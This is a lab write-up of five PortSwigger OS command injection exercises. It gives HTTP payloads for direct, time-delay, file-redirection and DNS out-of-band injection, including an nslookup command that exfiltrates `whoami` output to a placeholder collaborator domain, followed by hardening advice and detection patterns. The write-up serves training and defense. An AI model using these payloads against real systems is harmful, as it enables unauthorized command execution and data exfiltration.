# PortSwigger OS Command Injection 1-5 — The Channel Matters

This is a consolidated walkthrough of the five PortSwigger OS command injection labs.

All labs were solved in the authorized Web Security Academy environment. The main lesson is that command injection is a two-part problem: first get execution, then find a channel to observe it.

## 1. Overview

| # | Lab | Injection point | Observation channel | Core payload |
|---|-----|-----------------|---------------------|--------------|
| 1 | simple case | stock checker `storeId` | direct HTTP response | `1|whoami` |
| 2 | blind with time delays | feedback `email` | response delay | `x||ping -c 10 127.0.0.1||` |
| 3 | blind with output redirection | feedback `email` | writable web directory | `whoami>/var/www/images/output.txt` |
| 4 | blind with OOB interaction | feedback `email` | DNS lookup | `nslookup x.COLLAB-DOMAIN` |
| 5 | blind with OOB data exfiltration | feedback `email` | DNS subdomain data | ``nslookup `whoami`.COLLAB-DOMAIN`` |

## 2. Decision tree

```text
Does command output appear in the response?
  yes -> run a minimal proof such as whoami
  no  -> can response time be influenced?
          yes -> ping/sleep delay oracle
          no  -> can output be redirected to a web-readable path?
                  yes -> write output, then fetch it
                  no  -> use DNS/HTTP out-of-band interaction
```

The labs use a narrow set of shell separators:

```text
| command
|| command ||
`command`
```

In real assessments, `;`, `&`, `$()`, newlines, and platform-specific separators need to be considered as well.

## 3. Direct output

The stock checker passes `storeId` into a shell command and returns raw command output. The proof is:

```http
POST /product/stock
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1|whoami
```

Because stdout is returned, no side channel is needed.

## 4. Time-based blind proof

The feedback form executes a command but suppresses output. A local `ping` creates a measurable delay:

```http
email=x||ping -c 10 127.0.0.1||
```

One implementation detail matters when automating this lab: in an `application/x-www-form-urlencoded` body, `+` decodes to a space. If a script sets the parameter value directly, use real spaces and let the HTTP library encode them.

## 5. Output redirection

The third lab has a writable web-served directory:

```http
email=||whoami>/var/www/images/output.txt||
```

Then retrieve:

```http
GET /image?filename=output.txt
```

This turns a blind injection into direct output retrieval. The risk pattern is a web process that can both write to and serve from the same directory tree.

## 6. Out-of-band DNS

When the command runs asynchronously and no accessible file path exists, DNS is the smallest reliable proof:

```http
email=x||nslookup x.COLLAB-DOMAIN||
```

The basic OOB lab only needs an interaction. In a real test, the OAST server log is what confirms that the target executed the command.

For data exfiltration, place the command output in the leftmost DNS label:

```http
email=||nslookup `whoami`.COLLAB-DOMAIN||
```

The DNS query contains the username as a subdomain. Longer outputs require chunking and DNS-safe encoding.

## 7. Defense and detection

Hardening:

- Avoid shell invocation for user-controlled operations.
- If an OS command is unavoidable, use argument arrays and fixed allowlists.
- Reject shell metacharacters by command semantics, not by fragile blacklist escaping.
- Keep the web process unable to write into served static directories.
- Apply least privilege to the application account.
- Restrict outbound DNS and HTTP egress from application servers.
- Log command task failures and parameter sources instead of silently running asynchronous jobs.

Detection ideas:

- Web parameters containing `|`, `||`, `;`, `&`, backticks, `$()`, or redirection operators.
- Non-command fields such as email/name/message containing `whoami`, `id`, `ping`, `sleep`, `nslookup`, or `curl`.
- Unexpected files written to image/static directories.
- Application servers resolving random external domains.
- DNS labels that look like usernames, hostnames, or command output.
- HTTP responses delayed by regular 5s/10s/20s intervals.

No unresolved lab remains in this series. The OOB labs require an observable DNS/OAST channel in principle; if no readable channel is available in a future run, they should be recorded as pending user collaboration rather than blocking the rest of the roadmap.
